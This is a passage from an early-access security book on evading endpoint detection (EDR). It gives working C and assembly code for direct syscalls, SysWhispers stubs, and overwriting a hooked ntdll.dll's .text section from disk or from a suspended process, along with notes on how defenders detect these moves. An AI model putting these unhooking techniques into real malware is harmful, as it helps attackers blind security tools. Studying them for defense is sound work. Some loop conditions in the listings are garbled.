PVOID BaseAddress,
ULONG ZeroBits,
PULONG RegionSize,
ULONG AllocationType,
ULONG Protect);
Listing 2-8: The definition of NtAllocateVirtualMemory() to be included in the project 
header file
This function definition contains all the required parameters and their 
types, along with the return type. It should live in our header file, syscall.h, 
and will be included in our C source file, shown in Listing 2-9.
#include "syscall.h"
void wmain()dg
{
LPVOID lpAllocationStart = NULL;
 1 NtAllocateVirtualMemory(GetCurrentProcess(),
&lpAllocationStart,
Evading EDR (Early Access) © 2023 by Matt Hand
26   Chapter 2
0,
(PULONG)0x1000,
MEM_COMMIT | MEM_RESERVE,
PAGE_READWRITE);
}
Listing 2-9: Making a direct syscall in C
The wmain() function in this file calls NtAllocateVirtualMemory() 1 to 
allocate a 0x1000-byte buffer in the current process with read-write permis-
sions. This function is not defined in the header files that Microsoft makes 
available to developers, so we have to define it in our own header file. When 
this function is invoked, rather than calling into ntdll.dll, the assembly code 
we included in the project will be called, effectively simulating the behavior 
of an unhooked ntdll!NtAllocateVirtualMemory() without running the risk of 
hitting an EDR’s hook.
One of the primary challenges of this technique is that Microsoft fre-
quently changes syscall numbers, so any tooling that hardcodes these num-
bers may only work on specific Windows builds. For example, the syscall 
number for ntdll!NtCreateThreadEx() on build 1909 of Windows 10 is 0xBD. 
On build 20H1, the following release, it is 0xC1. This means that a tool tar-
geting build 1909 won’t work on later versions of Windows.
To help address this limitation, many developers rely on external 
sources to track these changes. For example, Mateusz Jurczyk of Google’s 
Project Zero maintains a list of functions and their associated syscall num-
bers for each release of Windows. In December 2019, Jackson Thuraisamy 
published the tool SysWhispers, which gave attackers the ability to dynami-
cally generate the function signatures and assembly code for the syscalls in 
their offensive tooling. Listing 2-10 shows the assembly code generated by 
SysWhispers when targeting the ntdll!NtCreateThreadEx() function on builds 
1903 through 20H2 of Windows 10.
NtCreateThreadEx PROC
  mov rax, gs:[60h] ; Load PEB into RAX.
NtCreateThreadEx_Check_X_X_XXXX: ; Check major version.
  cmp dword ptr [rax+118h], 10
  je NtCreateThreadEx_Check_10_0_XXXX
  jmp NtCreateThreadEx_SystemCall_Unknown
1 NtCreateThreadEx_Check_10_0_XXXX: ;
  cmp word ptr [rax+120h], 18362
  je NtCreateThreadEx_SystemCall_10_0_18362
  cmp word ptr [rax+120h], 18363
  je NtCreateThreadEx_SystemCall_10_0_18363
  cmp word ptr [rax+120h], 19041
  je NtCreateThreadEx_SystemCall_10_0_19041
  cmp word ptr [rax+120h], 19042
  je NtCreateThreadEx_SystemCall_10_0_19042
  jmp NtCreateThreadEx_SystemCall_Unknown
NtCreateThreadEx_SystemCall_10_0_18362: ; Windows 10.0.18362 (1903)
 2 mov eax, 00bdh
  jmp NtCreateThreadEx_Epilogue
Evading EDR (Early Access) © 2023 by Matt Hand
Function-Hooking Dlls   27
NtCreateThreadEx_SystemCall_10_0_18363: ; Windows 10.0.18363 (1909)
  mov eax, 00bdh
  jmp NtCreateThreadEx_Epilogue
NtCreateThreadEx_SystemCall_10_0_19041: ; Windows 10.0.19041 (2004)
  mov eax, 00c1h
  jmp NtCreateThreadEx_Epilogue
NtCreateThreadEx_SystemCall_10_0_19042: ; Windows 10.0.19042 (20H2)
  mov eax, 00c1h
  jmp NtCreateThreadEx_Epilogue
NtCreateThreadEx_SystemCall_Unknown: ; Unknown/unsupported version.
  ret
NtCreateThreadEx_Epilogue:
  mov r10, rcx
  3 syscall
  ret
NtCreateThreadEx ENDP
Listing 2-10: The SysWhispers output for ntdll!NtCreateThreadEx()
This assembly code extracts the build number from the process envi-
ronment block 1 and then uses that value to move the appropriate syscall 
number into the EAX register 2 before making the syscall 3. While this 
approach works, it requires substantial effort, as the attacker must update 
the syscall numbers in their dataset each time Microsoft releases a new 
Windows build.
Dynamically Resolving Syscall Numbers
In December 2020, a researcher known by the Twitter handle @modexp-
blog published a blog post titled “Bypassing User-Mode Hooks and Direct 
Invocation of System Calls for Red Teams.” The post described another 
function-hook evasion technique: dynamically resolving syscall numbers at 
runtime, which kept attackers from having to hardcode the values for each 
Windows build. This technique uses the following workflow to create a dic-
tionary of function names and syscall numbers:
 1. Get a handle to the current process’s mapped ntdll.dll.
 2. Enumerate all exported functions that begin with Zw to identify system 
calls. Note that functions prefixed with Nt (which is more commonly 
seen) work identically when called from user mode. The decision to use 
the Zw version appears to be arbitrary in this case.
 3. Store the exported function names and their associated relative virtual 
addresses.
 4. Sort the dictionary by relative virtual addresses.
 5. Define the syscall number of the function as its index in the dictionary 
after sorting.
Using this technique, we can collect syscall numbers at runtime, insert 
them into the stub at the appropriate location, and then call the target 
functions as we otherwise would in the statically coded method.
Evading EDR (Early Access) © 2023 by Matt Hand
28   Chapter 2
Remapping ntdll.dll
Another common technique used to evade user-mode function hooks is to 
load a new copy of ntdll.dll into the process, overwrite the existing hooked 
version with the contents of the newly loaded file, and then call the desired 
functions. This strategy works because the newly loaded ntdll.dll does not 
contain the hooks implemented in the copy loaded earlier, so when it over-
writes the tainted version, it effectively cleans out all the hooks placed by 
the EDR. Listing 2-11 shows a rudimentary example of this. Some lines have 
been omitted for brevity.
int wmain()
{
HMODULE hOldNtdll = NULL;
MODULEINFO info = {};
LPVOID lpBaseAddress = NULL;
HANDLE hNewNtdll = NULL;
HANDLE hFileMapping = NULL;
LPVOID lpFileData = NULL;
PIMAGE_DOS_HEADER pDosHeader = NULL;
PIMAGE_NT_HEADERS64 pNtHeader = NULL;
hOldNtdll = GetModuleHandleW(L"ntdll");
if (!GetModuleInformation(
 GetCurrentProcess(),
 hOldNtdll,
 &info,
 sizeof(MODULEINFO)))
 1 
lpBaseAddress = info.lpBaseOfDll;
  hNewNtdll = CreateFileW(
 L"C:\\Windows\\System32\\ntdll.dll",
 GENERIC_READ,
 FILE_SHARE_READ,
 NULL,
 OPEN_EXISTING,
 FILE_ATTRIBUTE_NORMAL,
 NULL);
  hFileMapping = CreateFileMappingW(
 hNewNtdll,
 NULL,
 PAGE_READONLY | SEC_IMAGE,
 0, 0, NULL);
 2 lpFileData = MapViewOfFile(
 hFileMapping,
 FILE_MAP_READ,
 0, 0, 0);
pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;
pNtHeader = (PIMAGE_NT_HEADERS64)((ULONG_PTR)lpBaseAddress + pDosHeader->e_lfanew);
Evading EDR (Early Access) © 2023 by Matt Hand
Function-Hooking Dlls   29
for (int i = 0; i FileHeader.NumberOfSections; i++)
{
 PIMAGE_SECTION_HEADER pSection =
(PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(pNtHeader) +
((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
3  if (!strcmp((PCHAR)pSection->Name, ".text"))
  {
DWORD dwOldProtection = 0;
4 VirtualProtect(
(LPVOID)((ULONG_PTR)lpBaseAddress + pSection->VirtualAddress),
pSection->Misc.VirtualSize,
PAGE_EXECUTE_READWRITE,
&dwOldProtection
);
5 memcpy(
(LPVOID)((ULONG_PTR)lpBaseAddress + pSection->VirtualAddress),
(LPVOID)((ULONG_PTR)lpFileData + pSection->VirtualAddress),
pSection->Misc.VirtualSize
);
6 VirtualProtect(
(LPVOID)((ULONG_PTR)lpBaseAddress + pSection->VirtualAddress),
pSection->Misc.VirtualSize,
dwOldProtection,
&dwOldProtection
);
 break;
 }
}
--snip--
}
Listing 2-11: A technique for overwriting a hooked ntdll.dll
Our code first gets the base address of the currently loaded (hooked) 
ntdll.dll 1. Then we read in the contents of ntdll.dll from disk and map it 
into memory 2. At this point, we can parse the PE headers of the hooked 
ntdll.dll, looking for the address of the .text section 3, which holds the exe-
cutable code in the image. Once we find it, we change the permissions of 
that region of memory so that we can write to it 4, copy in the contents of 
the .text section from the “clean” file 5, and revert the change to memory 
protection 6. After this sequence of events completes, the hooks originally 
placed by the EDR should have been removed and the developer can call 
whichever function from ntdll.dll they need without the fear of execution 
being redirected to the EDR’s injected DLL.
While reading ntdll.dll from disk seems easy, it does come with a 
potential trade-off. This is because loading ntdll.dll into a single process 
multiple times is atypical behavior. Defenders can capture this activity with 
Sysmon, a free system-monitoring utility that provides many of the same 
Evading EDR (Early Access) © 2023 by Matt Hand
30   Chapter 2
telemetry-collection facilities as an EDR. Almost every non-malicious pro-
cess has a one-to-one mapping of process GUIDs to loads of ntdll.dll. When 
I queried these properties in a large enterprise environment, only approxi-
mately 0.04 percent of 37 million processes loaded ntdll.dll more than once 
over the course of a month.
To avoid detection based on this anomaly, you might opt to spawn a 
new process in a suspended state, get a handle to the unmodified ntdll.dll 
mapped in the new process, and copy it to the current process. From there, 
you could either get the function pointers as shown before, or replace the 
existing hooked ntdll.dll to effectively overwrite the hooks placed by the 
EDR. Listing 2-12 demonstrates this technique.
int wmain() {
LPVOID pNtdll = nullptr;
MODULEINFO mi;
STARTUPINFOW si;
PROCESS_INFORMATION pi;
ZeroMemory(&si, sizeof(STARTUPINFOW));
ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
GetModuleInformation(GetCurrentProcess(),
GetModuleHandleW(L"ntdll.dll"),
 1 &mi, sizeof(MODULEINFO));
PIMAGE_DOS_HEADER hooked_dos = (PIMAGE_DOS_HEADER)mi.lpBaseOfDll;
PIMAGE_NT_HEADERS hooked_nt =
 2 (PIMAGE_NT_HEADERS)((ULONG_PTR)mi.lpBaseOfDll + hooked_dos->e_lfanew);
  CreateProcessW(L"C:\\Windows\\System32\\notepad.exe",
NULL, NULL, NULL, TRUE, CREATE_SUSPENDED,
 3 NULL, NULL, &si, &pi);
 pNtdll = HeapAlloc(GetProcessHeap(), 0, mi.SizeOfImage);
 ReadProcessMemory(pi.hProcess, (LPCVOID)mi.lpBaseOfDll,
 pNtdll, mi.SizeOfImage, nullptr);
 PIMAGE_DOS_HEADER fresh_dos = (PIMAGE_DOS_HEADER)pNtdll;
 PIMAGE_NT_HEADERS fresh_nt =
 4 (PIMAGE_NT_HEADERS)((ULONG_PTR)pNtdll + fresh_dos->e_lfanew);
 for (WORD i = 0; i FileHeader.NumberOfSections; i++) {
PIMAGE_SECTION_HEADER hooked_section =
(PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(hooked_nt) +
((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
if (!strcmp((PCHAR)hooked_section->Name, ".text")){
DWORD oldProtect = 0;
LPVOID hooked_text_section = (LPVOID)((ULONG_PTR)mi.lpBaseOfDll +
(DWORD_PTR)hooked_section->VirtualAddress);
LPVOID fresh_text_section = (LPVOID)((ULONG_PTR)pNtdll +
(DWORD_PTR)hooked_section->VirtualAddress);
Evading EDR (Early Access) © 2023 by Matt Hand
Function-Hooking Dlls   31
VirtualProtect(hooked_text_section,
hooked_section->Misc.VirtualSize,
PAGE_EXECUTE_READWRITE,
&oldProtect);
RtlCopyMemory(
hooked_text_section,
fresh_text_section,
hooked_section->Misc.VirtualSize);
VirtualProtect(hooked_text_section,
hooked_section->Misc.VirtualSize,
oldProtect,
&oldProtect);
}
}
TerminateProcess(pi.hProcess, 0);
--snip--
return 0;
}
Listing 2-12: Remapping ntdll.dll in a suspended process
This minimal example first opens a handle to the copy of ntdll.dll 1 
currently mapped into our process, gets its base address, and parses its PE 
headers 2. Next, it creates a suspended process 3 and parses the PE head-
ers of this process’s copy of ntdll.dll 4 , which hasn’t had the chance to be 
hooked by the EDR yet. The rest of the flow of this function is exactly the 
same as in the previous example, and when it completes, the hooked ntdll.
dll should have been reverted to a clean state.
As with all things, there is a trade-off here as well, as our new sus-
pended process creates another opportunity for detection, such as by a 
hooked ntdll!NtCreateProcessEx(), the driver, or the ETW provider. In my 
experience, it is very rare to see a program create a temporary suspended 
process for legitimate reasons.
Conclusion
Function hooking is one of the original mechanisms by which an endpoint 
security product can monitor the execution flow of other processes. While it 
provides very useful information to an EDR, it is very susceptible to bypass 
due to inherent weaknesses in its common implementations. For that rea-
son, most mature EDRs today consider it an auxiliary telemetry source and 
instead rely on more resilient sensors.
Evading EDR (Early Access) © 2023 by Matt Hand
Evading EDR (Early Access) © 2023 by Matt Hand
Most modern EDR solutions rely heavily on 
functionality supplied through their kernel-
mode driver, which is the sensor component 
running in a privileged layer of the operating 
system, beneath the user mode. These drivers give 
developers the ability to leverage features that are only 
available inside the kernel, supplying EDRs with many 
of their preventive features and telemetry.
While vendors can implement a vast number of security-relevant fea-
tures in their drivers, the most common one is notification callback routines. 
These are internal routines that take actions when a designated system 
event occurs.
In the next three chapters, we’ll discuss how modern EDRs leverage 
notification callback routines to gain valuable insight into system events 
from the kernel. We’ll also cover the evasion techniques relevant to each 
type of notification and its related callback routines. This chapter focuses 
3
PROCE S S - A ND T HR E A D -
CR E AT ION NOT IF IC AT ION S
Evading EDR (Early Access) © 2023 by Matt Hand
34   Chapter 3
on two types of callback routines used very often in EDRs: those related to 
process creation and thread creation.
How Notification Callback Routines Work
One of the most powerful features of drivers in the context of EDRs is the 
ability to be notified when a system event occurs. These system events might 
include creating or terminating new processes and threads, requesting to 
duplicate processes and threads, loading images, taking actions in the reg-
istry, or requesting a shutdown of the system. For example, a developer may 
want to know whether a process attempts to open a new handle to lsass.exe, 
because this is a core component of most credential-dumping techniques.
To do this, the driver registers callback routines, which essentially just 
say, “Let me know if this type of event occurs on the system so I can do 
something.” As a result of these notifications, the driver can take action. 
Sometimes it might simply collect telemetry from the event notification. 
Alternatively, it might opt to do something like provide only partial access to 
the sensitive process, such as by returning a handle with a limited-access mask 
(for example, PROCESS_QUERY_LIMITED_INFORMATION instead of PROCESS_ALL_ACCESS).
Callback routines may be either pre-operation, occurring before the 
event completes, or post-operation, occurring after the operation. Pre-
operation callbacks are more common in EDRs, as they give the driver the 
ability to interfere with the event or prevent it from completing, as well as 
other side benefits that we’ll discuss in this chapter. Post-operation call-
backs are useful too, as they can provide information about the result of 
the system event, but they have some drawbacks. The largest of these is the 
fact that they’re often executed in an arbitrary thread context, making it 
difficult for an EDR to collect information about the process or thread that 
started the operation.
Process Notifications
Callback routines can notify drivers whenever a process is created or termi-
nated on the system. These notifications happen as an integral part of the 
process creation or termination. You can see this in Listing 3-1, which shows 
the call stack for creation of a child process of cmd.exe, notepad.exe, that led 